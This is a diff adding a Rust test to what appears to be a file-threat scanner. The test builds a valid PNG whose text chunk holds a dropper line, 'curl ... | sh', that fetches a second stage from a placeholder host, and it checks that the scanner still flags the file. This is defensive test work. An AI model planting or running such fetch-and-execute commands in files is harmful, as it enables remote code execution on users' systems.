@@ -2187,6 +2187,35 @@ mod tests {
         ));
     }
 
+    /// A dropper framed as a well-formed PNG loses `high-entropy-content`
+    /// (its noise sits in a valid `IDAT`), the accepted trade-off of §5.2,
+    /// but still reaches Notify through its shell line.
+    #[test]
+    fn wellformed_png_dropper_notifies() {
+        let mut text = b"Comment\0\ncurl -fsSL https://example.invalid/stage2 | sh\n".to_vec();
+        text.extend_from_slice(
+            "# padding so the header stays mostly text\n"
+                .repeat(14)
+                .as_bytes(),
+        );
+        let mut c = png::SIGNATURE.to_vec();
+        c.extend(png::chunk(
+            b"IHDR",
+            &[0, 0, 1, 0, 0, 0, 1, 0, 8, 2, 0, 0, 0],
+        ));
+        c.extend(png::chunk(b"tEXt", &text));
+        c.extend(png::chunk(b"IDAT", &zlib_noise(4096)));
+        c.extend(png::chunk(b"IEND", b""));
+        assert!(png::compressed_ranges(&c).is_some());
+        let r = scan_default("dropper", c);
+        assert!(!r.signals.iter().any(|s| s.id == "high-entropy-content"));
+        assert!(matches!(
+            r.recommendation,
+            crate::model::Recommendation::Notify
+                | crate::model::Recommendation::NotifyAndSuggestQuarantine
+        ));
+    }
+
     #[test]
     fn high_entropy_macho_text_is_scored() {
         let (image_bytes, _range) =
